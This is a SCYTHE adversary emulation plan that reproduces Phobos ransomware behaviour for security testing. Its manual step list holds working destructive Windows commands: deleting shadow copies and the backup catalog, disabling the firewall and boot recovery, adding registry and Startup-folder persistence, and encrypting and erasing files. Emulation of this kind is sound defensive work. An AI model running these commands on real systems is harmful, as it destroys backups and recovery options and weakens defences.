# Phobos Ransomware Adversary Emulation Plan

This threat is based on the BlackBerry blog post: https://blogs.blackberry.com/en/2021/09/threat-thursday-phobos-ransomware

## Emulate with SCYTHE
**Note this threat, if executed with administrative privileges, will delete Volume Shadow Copies and modify bootup. For testing purposes, you may want to test in non-production, make an offline backup, and/or or take a snapshot. 

1. Download and import the threat in JSON format to your SCYTHE instance 
2. Download the Virtual File System (VFS) files under the VFS folder
3. Upload the VFS files to your SCYTHE VFS in the following location: VFS:/shared/threats/Phobos
4. Create a new campaign
5. Import from Existing Threat: Phobos
6. Launch Campaign
7. Download the 32-bit EXE payload generated by SCYTHE 
8. Rename the file to horsemoney.exe
9. Execute horsemoney.exe (it will try to escalate privileges on its own)

## Manual Emulation with SCYTHE
1. loader --load run
2. loader --load file
3. controller --integrity
4. Decision: if running elevated, go to step 9
5. loader --load elevate
6. elevate --prompt
7. controller --integrity
8. Decision: if not running elevated, go to step 20
9. STEP = DEFENSE EVASION
10. run vssadmin delete shadows /all /quiet
11. run netsh advfirewall set currentprofile state off
12. run netsh firewall set opmode mode=disable
13. run wmic shadowcopy delete
14. run bcdedit  /set {default} bootstatuspolicy ignoreallfailures
15. run bcdedit  /set {default} recoveryenabled no
16. run wbadmin delete catalog -quiet
17. STEP = PERSISTENCE
18. file --create --path "%AllUsersProfile%\Microsoft\Windows\Start Menu\Programs\StartUp\horsemoney.exe" --size 1MB --count 1 --random
19. run cmd /c REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Windows\CurrentVersion\Run\horsemoney /v Example /d "Phobos Data" /f
20. file --create --path "%LocalAppData%\horsemoney.exe" --size 1MB --count 1 --random
21. file --create --path "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\horsemoney.exe" --size 1MB --count 1 --random
22. run cmd /c REG ADD HKEY_CURRENT_USER\SOFTWARE\WOW6432Node\Windows\CurrentVersion\Run\horsemoney /v Example /d "Phobos Data" /f
23. STEP = IMPACT
24. run cmd /c mkdir "%USERPROFILE%\Desktop\Phobos"
25. file --create --path "%USERPROFILE%\Desktop\Phobos\target_file.xls" --size 1MB --count 100 --random
26. loader --load crypt
27. crypt --target "%USERPROFILE%\Desktop\Phobos\" --encrypt --password "#RansomwareSucks" --erase
28. file --create --path "%USERPROFILE%\Desktop\Phobos\encryptedfile.HORSEMONEY" --size 1MB --count 1 --random
29. loader --load downloader
30. downloader --src "VFS:/shared/threats/Phobos/info.hta" --dest "%USERPROFILE%\Desktop\Phobos\info.hta"
31. run mshta.exe "%USERPROFILE%\Desktop\Phobos\info.hta" &
32. STEP = CLEANUP
33. run cmd /c del "%LocalAppData%\horsemoney.exe"
34. run cmd /c del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\horsemoney.exe"
35. run cmd /c REG DELETE HKEY_CURRENT_USER\SOFTWARE\WOW6432Node\Windows\CurrentVersion\Run\horsemoney /f
36. run cmd /c rmdir /Q /S "%USERPROFILE%\Desktop\Phobos"
37. controller --shutdown